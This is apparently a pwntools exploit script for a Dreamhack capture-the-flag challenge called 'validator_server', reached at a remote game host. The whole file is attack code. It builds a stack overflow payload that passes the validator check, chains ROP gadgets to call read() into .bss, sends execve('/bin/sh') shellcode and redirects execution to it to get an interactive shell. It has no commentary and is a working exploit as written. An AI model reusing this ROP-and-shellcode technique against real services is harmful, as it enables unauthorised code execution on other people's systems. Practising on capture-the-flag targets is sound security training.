from pwn import *
#p = process("./validator_server")
p = remote("host1.dreamhack.games", 15003)
pause()
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
elf = ELF("./validator_server")
payload = "DREAMHACK!"
pop_rdi = 0x00000000004006f3
pop_rsi_r15 = 0x00000000004006f1
pop_rdx = 0x000000000040057b

for i in range(128, 3 ,-1):
    payload += chr(i)
payload += "a"
temp_payload = payload
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(elf.bss())
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(40)
payload += p64(elf.plt['read'])
payload += p64(0x0000000000400637)
p.sendline(payload)
sleep(0.1)
p.sendline(shellcode)
sleep(0.1)

temp_payload += p64(elf.bss())

p.sendline(temp_payload)
p.interactive()
